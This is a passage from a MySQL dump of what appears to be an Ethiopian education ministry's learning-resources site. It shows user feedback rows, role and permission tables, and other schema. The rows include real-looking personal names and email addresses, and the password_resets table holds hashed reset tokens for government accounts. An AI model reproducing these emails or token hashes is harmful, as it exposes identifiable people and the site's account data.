16:15:19','2021-07-29 16:15:19'),(326,'Comments','It is good approach!','Assefa','Kare','karoyeassefa@gmail.com','2021-07-29 19:11:46','2021-07-29 19:11:46'),(327,'Comments','It is good approach!','Assefa','Kare','karoyeassefa@gmail.com','2021-07-29 19:12:02','2021-07-29 19:12:02'),(328,'Comments','It is good approach!','Assefa','Kare','karoyeassefa@gmail.com','2021-07-29 19:12:07','2021-07-29 19:12:07'),(329,'Comments','It is good approach!','Assefa','Kare','karoyeassefa@gmail.com','2021-07-29 19:12:15','2021-07-29 19:12:15'),(330,'Comments','It is good approach!','Assefa','Kare','karoyeassefa@gmail.com','2021-07-29 19:12:18','2021-07-29 19:12:18'),(331,'Comments','It is good approach!','Assefa','Kare','karoyeassefa@gmail.com','2021-07-29 19:12:27','2021-07-29 19:12:27'),(332,'Comments','It is good approach!','Assefa','Kare','karoyeassefa@gmail.com','2021-07-29 19:12:33','2021-07-29 19:12:33'),(333,'Comments','It is good approach!','Assefa','Kare','karoyeassefa@gmail.com','2021-07-29 19:12:37','2021-07-29 19:12:37'),(334,'Comments','It is good approach!','Assefa','Kare','karoyeassefa@gmail.com','2021-07-29 19:12:38','2021-07-29 19:12:38'),(335,'Comments','It is good approach!','Assefa','Kare','karoyeassefa@gmail.com','2021-07-29 19:12:38','2021-07-29 19:12:38'),(336,'Question','how to get calculus volume 1','sufian','aliyii','sufianaliyyii11@gmail.com','2021-07-31 08:37:03','2021-07-31 08:37:03'),(337,'Comments','It is very important web but all the reference are not listed on your address','TSEGAY','GEBREMEDHN','Tsegay2014@gmail.com','2021-08-01 10:48:19','2021-08-01 10:48:19'),(338,'Comments','It is very important web but all the reference are not listed on your address','TSEGAY','GEBREMEDHN','Tsegay2014@gmail.com','2021-08-01 10:48:51','2021-08-01 10:48:51'),(349,'Comments','Its good','Yonas','Biset','yonasbiset2012@gmail.com','2021-08-10 06:06:32','2021-08-10 06:06:32'),(350,'Suggestions','Maths unit 5 ,physics ,biology unit 5 grade 12 and other vidio please give us','Mikiyas sisay','Gadissa','msisay@gmail.com','2021-08-10 06:19:42','2021-08-10 06:19:42'),(351,'Question','Maths unit 5 ,physics ,biology unit 5 grade 12 and other vidio please give us','Mikiyas sisay','Gadissa','msisay@gmail.com','2021-08-10 06:19:46','2021-08-10 06:19:46'),(352,'Question','Maths unit 5 ,physics ,biology unit 5 grade 12 and other vidio please give us','Mikiyas sisay','Gadissa','msisay@gmail.com','2021-08-10 06:19:49','2021-08-10 06:19:49'),(353,'Question','Maths unit 5 ,physics ,biology unit 5 grade 12 and other vidio please give us','Mikiyas sisay','Gadissa','msisay@gmail.com','2021-08-10 06:19:52','2021-08-10 06:19:52'),(354,'Comments','በጣም አሪፍ ነው፡፡ ግን ስማርት ስልክ የሌሉ አሉ tablet, tv, computer የማይጠቀሙ አሉና ሌላ ሌላ አማራጭ ብታሰብ','Abebe shoyisha','Somo','abebeshoysha@gmail.com','2021-08-12 20:27:10','2021-08-12 20:27:10'),(355,'Question','Dear administrator of this page, please can you upload text books for Addis Ababa education office text books?','Samuel','Addo','bboysami@gmail.com','2021-08-13 07:45:21','2021-08-13 07:45:21'),(356,'Question','Can you upload video resources for elementary grades?','Naty','Asfaw','natyasfaw@gmail.com','2021-08-16 05:52:12','2021-08-16 05:52:12'),(357,'Question','Bro:\r\nNo! I never spammed on groups at all. But sometimes I send invitation links yo my friends because I want them','Abrhan','Asfa','asfaabrham870@gmail.com','2021-08-19 11:46:54','2021-08-19 11:46:54'),(358,'Comments','Hi','Yilma','Eshetu','yilmakaraso@gmail.com','2021-08-19 21:59:08','2021-08-19 21:59:08'),(359,'Comments','It is good learning','Mahamed','Ahmed','Haybe2718@gmail.com','2021-09-01 14:28:08','2021-09-01 14:28:08'),(360,'Comments','I am very happy to to get this materials for your website Thank You Great','Alemayehu','Erensa','alemayehuerensaa@gmail.com','2021-09-21 12:27:00','2021-09-21 12:27:00'),(361,'Suggestions','Thank you','Alemhulu','Awekelgne','Alemhulu@gmai.com','2021-10-04 09:22:44','2021-10-04 09:22:44'),(362,'Suggestions','Thank you','Alemhulu','Awekelgne','Alemhulu@gmai.com','2021-10-04 09:22:45','2021-10-04 09:22:45'),(363,'Suggestions','Thank you!!','Alemhulu','Awekelgne','alemhulu@gmail.com','2021-10-04 09:29:26','2021-10-04 09:29:26'),(364,'Suggestions','there is not History textbook except grade 11 so it is better to include the other grade history subject','Mequanint','Chekol','mequante2@gmail.com','2021-10-18 07:32:08','2021-10-18 07:32:08'),(365,'Suggestions','thank you so much','Bayu','Nega','bayunega@518gmail.com','2021-10-22 01:06:12','2021-10-22 01:06:12'),(366,'Suggestions','thank you so much','Bayu','Nega','bayunega@518gmail.com','2021-10-22 01:06:12','2021-10-22 01:06:12'),(367,'Comments','I\'m english teacher for high school','Abdulahi','Sheikh','Abdulahisheikh@gov.et','2021-12-04 21:56:41','2021-12-04 21:56:41'),(368,'Comments','I\'m english teacher for high school','Abdulahi','Sheikh','Abdulahisheikh@gov.et','2021-12-04 21:57:01','2021-12-04 21:57:01'),(369,'Comments','I\'m english teacher for high school','Abdulahi','Sheikh','Abdulahisheikh@gov.et','2021-12-04 21:57:09','2021-12-04 21:57:09'),(370,'Comments','I\'m english teacher for high school','Abdulahi','Sheikh','Abdulahisheikh@gov.et','2021-12-04 21:57:09','2021-12-04 21:57:09'),(371,'Suggestions','I need to get teacher guide books for grade 9&10 english because I\'m teacher I have to get it','Abdulahi','Sheikh','Cabdulahisheikh64@gmail.com','2021-12-07 18:39:00','2021-12-07 18:39:00'),(372,'Suggestions','I need to get teacher guide books for grade 9&10 english because I\'m teacher I have to get it','Abdulahi','Sheikh','Cabdulahisheikh64@gmail.com','2021-12-07 18:39:00','2021-12-07 18:39:00'),(373,'Question','I need to get teacher guide books for grade 9&10 english because I\'m teacher I have to get it','Abdulahi','Sheikh','Cabdulahisheikh64@gmail.com','2021-12-07 18:39:00','2021-12-07 18:39:00'),(374,'Comments','What is the need to disintegrate Textbooks in to units instead of complete books as one??','mesfin','eshetu','eshetumesf@yahoo.com','2022-02-02 15:46:52','2022-02-02 15:46:52'),(375,'Comments','srtjdyjh','Unity','Universty','superadmin@gmail.com','2022-02-17 05:43:34','2022-02-17 05:43:34'),(376,'Comments','Very interesting jobs!\r\nAs my point of view; it is better to be offline reading & downloaded to eliminate additional expenses from student\'s Families.','Bayisa','Bekele','bayisabekele2022@gmail.com','2022-02-25 14:14:40','2022-02-25 14:14:40'),(377,'Comments','I want reading books','Lemlem','Tekalign','tekalignlemlem@gmail.com','2022-06-27 11:45:00','2022-06-27 11:45:00'),(378,'Comments','Dear Sir/Madam, thank you for putting all of these useful resources online.\r\nWhen I try to access grade 3 mathematics, units 1 and 4 are not accessible. Please check. Dr. Asrat from AASTU','Asrat Mulatu','Beyene','asrat.mulatu@aastu.edu.et','2022-08-01 09:10:15','2022-08-01 09:10:15');
/*!40000 ALTER TABLE `feedback` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `grades`
--

DROP TABLE IF EXISTS `grades`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `grades` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` int unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `grades`
--

LOCK TABLES `grades` WRITE;
/*!40000 ALTER TABLE `grades` DISABLE KEYS */;
/*!40000 ALTER TABLE `grades` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `languages`
--

DROP TABLE IF EXISTS `languages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `languages` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `languages_name_unique` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `languages`
--

LOCK TABLES `languages` WRITE;
/*!40000 ALTER TABLE `languages` DISABLE KEYS */;
INSERT INTO `languages` VALUES (1,'English','2020-10-02 11:39:50','2020-10-09 11:39:50'),(2,'Amharic','2020-10-01 11:40:02','2020-10-09 11:40:02');
/*!40000 ALTER TABLE `languages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `media`
--

DROP TABLE IF EXISTS `media`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `media` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `media`
--

LOCK TABLES `media` WRITE;
/*!40000 ALTER TABLE `media` DISABLE KEYS */;
INSERT INTO `media` VALUES (2,'Document','2020-10-09 11:41:20','2020-10-09 11:41:20'),(3,'Video','2020-10-09 11:41:26','2020-10-09 11:41:26');
/*!40000 ALTER TABLE `media` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `migrations` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=20 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `migrations`
--

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES (1,'2014_10_12_000000_create_users_table',1),(2,'2014_10_12_100000_create_password_resets_table',1),(3,'2014_10_12_200000_add_two_factor_columns_to_users_table',1),(4,'2019_08_19_000000_create_failed_jobs_table',1),(5,'2019_12_14_000001_create_personal_access_tokens_table',1),(6,'2020_09_28_162609_create_sessions_table',1),(7,'2020_09_30_140054_create_grades_table',1),(8,'2020_09_30_140129_create_courses_table',1),(9,'2020_09_30_140142_create_units_table',1),(10,'2020_09_30_140155_create_subunits_table',1),(11,'2020_09_30_140209_create_media_table',1),(12,'2020_09_30_140219_create_types_table',1),(13,'2020_09_30_141812_create_resources_table',1),(14,'2019_11_05_194946_create_posts_table',2),(15,'2019_11_05_213109_add_new_test_column_table',2),(16,'2019_11_05_220037_drop_new_column',2),(17,'2020_05_19_103751_create_roles_table',2),(18,'2020_05_19_193413_create_permissions_table',3),(19,'2020_06_20_010403_create_add_publish_post_collumn_table',4);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `password_resets`
--

DROP TABLE IF EXISTS `password_resets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `password_resets` (
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `password_resets`
--

LOCK TABLES `password_resets` WRITE;
/*!40000 ALTER TABLE `password_resets` DISABLE KEYS */;
INSERT INTO `password_resets` VALUES ('test@moe.gov.et','$2y$10$wyPd0Fne3qW8tYZd84AtV.IQICDuIyEUMd2N3lkYdasjBnHWer6PC','2020-10-20 09:35:38'),('abigail.asheber@moe.gov.et','$2y$10$pzESiUJeEOXSAJZjsqeHL.wN9WTK9ap.cU16Cjk2bvyBnyRwfLJY.','2020-10-26 10:03:52');
/*!40000 ALTER TABLE `password_resets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `permissions`
--

DROP TABLE IF EXISTS `permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `permissions` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=60 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `permissions`
--

LOCK TABLES `permissions` WRITE;
/*!40000 ALTER TABLE `permissions` DISABLE KEYS */;
INSERT INTO `permissions` VALUES (8,'create','create','2020-12-22 05:02:02','2020-12-22 05:02:02'),(9,'                    index','--------------------index','2020-12-22 05:02:02','2020-12-22 05:02:02'),(10,'                    show','--------------------show','2020-12-22 05:02:02','2020-12-22 05:02:02'),(11,'                    edit','--------------------edit','2020-12-22 05:02:02','2020-12-22 05:02:02'),(12,'                    update','--------------------update','2020-12-22 05:02:02','2020-12-22 05:02:02'),(13,'                    destroy','--------------------destroy','2020-12-22 05:02:02','2020-12-22 05:02:02'),(21,'destroy','destroy','2020-12-22 05:03:32','2020-12-22 05:03:32'),(38,'delete','delete','2021-01-22 08:43:14','2021-01-22 08:43:14'),(39,'edit','edit','2021-01-22 08:43:14','2021-01-22 08:43:14'),(40,'update','update','2021-01-22 08:43:14','2021-01-22 08:43:14'),(41,'show','show','2021-01-22 08:43:14','2021-01-22 08:43:14'),(42,'index','index','2021-01-22 08:43:14','2021-01-22 08:43:14'),(43,'index','index','2021-01-22 08:44:04','2021-01-22 08:44:04'),(44,'                    create','--------------------create','2021-01-22 08:44:04','2021-01-22 08:44:04'),(45,'                    store','--------------------store','2021-01-22 08:44:04','2021-01-22 08:44:04'),(46,'show','show','2021-01-22 08:44:04','2021-01-22 08:44:04'),(47,'edit','edit','2021-01-22 08:44:04','2021-01-22 08:44:04'),(53,'index','index','2021-04-01 05:58:15','2021-04-01 05:58:15'),(54,'create','create','2021-04-01 05:58:15','2021-04-01 05:58:15'),(55,'show','show','2021-04-01 05:58:15','2021-04-01 05:58:15'),(56,'edit','edit','2021-04-01 05:58:15','2021-04-01 05:58:15'),(57,'delete','delete','2021-04-01 05:58:15','2021-04-01 05:58:15'),(59,'','','2022-09-12 07:00:13','2022-09-12 07:00:13');
/*!40000 ALTER TABLE `permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `personal_access_tokens`
--

DROP TABLE IF EXISTS `personal_access_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `personal_access_tokens` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `tokenable_type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `tokenable_id` bigint unsigned NOT NULL,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `abilities` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `personal_access_tokens`
--

LOCK TABLES `personal_access_tokens` WRITE;
/*!40000 ALTER TABLE `personal_access_tokens` DISABLE KEYS */;
/*!40000 ALTER TABLE `personal_access_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `posts`
--

DROP TABLE IF EXISTS `posts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `posts` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `image_url` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `userId` int NOT NULL,
  `published` int NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `posts`
--

LOCK TABLES `posts` WRITE;
/*!40000 ALTER TABLE `posts` DISABLE KEYS */;
/*!40000 ALTER TABLE `posts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `quiz`
--

DROP TABLE IF EXISTS `quiz`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `quiz` (
  `id` bigint unsigned NOT NULL,
  `resource_id` int unsigned DEFAULT NULL,
  `question` varchar(255) DEFAULT NULL,
  `chA` varchar(255) DEFAULT NULL,
  `chB` varchar(255) DEFAULT NULL,
  `chC` varchar(255) DEFAULT NULL,
  `chD` varchar(255) DEFAULT NULL,
  `ans` varchar(255) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `time` int unsigned DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `quiz`
--

LOCK TABLES `quiz` WRITE;
/*!40000 ALTER TABLE `quiz` DISABLE KEYS */;
/*!40000 ALTER TABLE `quiz` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `quizzes`
--

DROP TABLE IF EXISTS `quizzes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `quizzes` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `resource_id` int unsigned DEFAULT NULL,
  `question` varchar(255) DEFAULT NULL,
  `chA` varchar(255) DEFAULT NULL,
  `chB` varchar(255) DEFAULT NULL,
  `chC` varchar(255) DEFAULT NULL,
  `chD` varchar(255) DEFAULT NULL,
  `ans` varchar(255) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `time` int unsigned DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=51 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `quizzes`
--

LOCK TABLES `quizzes` WRITE;
/*!40000 ALTER TABLE `quizzes` DISABLE KEYS */;
/*!40000 ALTER TABLE `quizzes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `reports`
--

DROP TABLE IF EXISTS `reports`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `reports` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `grade_id` int unsigned DEFAULT NULL,
  `course_id` int unsigned DEFAULT NULL,
  `type_id` int unsigned DEFAULT NULL,
  `media_id` int unsigned DEFAULT NULL,
  `totalViews` int unsigned DEFAULT NULL,
  `totalDownloads` int unsigned DEFAULT NULL,
  `totalAvailableResources` int unsigned DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=757 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `reports`
--

LOCK TABLES `reports` WRITE;
/*!40000 ALTER TABLE `reports` DISABLE KEYS */;
/*!40000 ALTER TABLE `reports` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `resources`
--

DROP TABLE IF EXISTS `resources`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `resources` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int unsigned DEFAULT NULL,
  `fileName` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `tag` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `thumbnailLocation` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `fileLocation` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `grade_id` int unsigned DEFAULT NULL,
  `course_id` int unsigned DEFAULT NULL,
  `unit_id` int unsigned DEFAULT NULL,
  `subunit_id` int unsigned DEFAULT NULL,
  `type_id` int unsigned NOT NULL,
  `media_id` int unsigned NOT NULL,
  `language_id` int NOT NULL DEFAULT '1',
  `format` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `size` int unsigned DEFAULT '0',
  `download` int unsigned DEFAULT '0',
  `view` int unsigned DEFAULT '0',
  `like` int unsigned DEFAULT '0',
  `deslike` int unsigned DEFAULT '0',
  `comment` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `published` int NOT NULL DEFAULT '0',
  `link` int NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5575 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `resources`
--

LOCK TABLES `resources` WRITE;
/*!40000 ALTER TABLE `resources` DISABLE KEYS */;
/*!40000 ALTER TABLE `resources` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `resourcestags`
--

DROP TABLE IF EXISTS `resourcestags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `resourcestags` (
  `resource_id` int NOT NULL,
  `tag_id` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `resourcestags`
--

LOCK TABLES `resourcestags` WRITE;
/*!40000 ALTER TABLE `resourcestags` DISABLE KEYS */;
/*!40000 ALTER TABLE `resourcestags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `roles`
--

DROP TABLE IF EXISTS `roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `roles` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `roles`
--

LOCK TABLES `roles` WRITE;
/*!40000 ALTER TABLE `roles` DISABLE KEYS */;
INSERT INTO `roles` VALUES (1,'admin','admin','2020-12-22 14:55:20','2020-12-22 14:55:20'),(2,'manager','manager','2020-12-22 13:50:17','2020-12-22 13:50:17'),(3,'content editor','content-editor','2020-12-22 13:54:05','2020-12-22 13:54:05'),(4,'user','user','2020-12-22 13:54:49','2020-12-22 13:54:49');
/*!40000 ALTER TABLE `roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `roles_permissions`
--

DROP TABLE IF EXISTS `roles_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `roles_permissions` (
  `role_id` int unsigned NOT NULL,
  `permission_id` int unsigned NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `roles_permissions`
--

LOCK TABLES `roles_permissions` WRITE;
/*!40000 ALTER TABLE `roles_permissions` DISABLE KEYS */;
INSERT INTO `roles_permissions` VALUES (2,37),(2,38),(2,39),(2,40),(2,41),(2,42),(3,43),(3,44),(3,45),(3,46),(3,47),(4,53),(4,54),(4,55),(4,56),(4,57),(1,59);
/*!40000 ALTER TABLE `roles_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sessions`
--

DROP TABLE IF EXISTS `sessions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sessions` (
  `id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` bigint unsigned DEFAULT NULL,
  `ip_address` varchar(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_agent` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `payload` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_activity` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sessions`
--

LOCK TABLES `sessions` WRITE;
/*!40000 ALTER TABLE `sessions` DISABLE KEYS */;
/*!40000 ALTER TABLE `sessions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `subunits`
--

DROP TABLE IF EXISTS `subunits`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `subunits` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` double(8,2) NOT NULL,
  `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `unit_id` int unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=81 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `subunits`
--

LOCK TABLES `subunits` WRITE;
/*!40000 ALTER TABLE `subunits` DISABLE KEYS */;
/*!40000 ALTER TABLE `subunits` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tags_resources`
--

DROP TABLE IF EXISTS `tags_resources`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `tags_resources` (
  `tag_id` int unsigned NOT NULL,
  `resource_id` int unsigned NOT NULL,
  KEY `tags_resources_tag_id_foreign` (`tag_id`),
  CONSTRAINT `tags_resources_tag_id_foreign` FOREIGN KEY (`tag_id`) REFERENCES `tags` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tags_resources`
--

LOCK TABLES `tags_resources` WRITE;
/*!40000 ALTER TABLE `tags_resources` DISABLE KEYS */;
/*!40000 ALTER TABLE `tags_resources` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `types`
--

DROP TABLE IF EXISTS `types`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `types` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
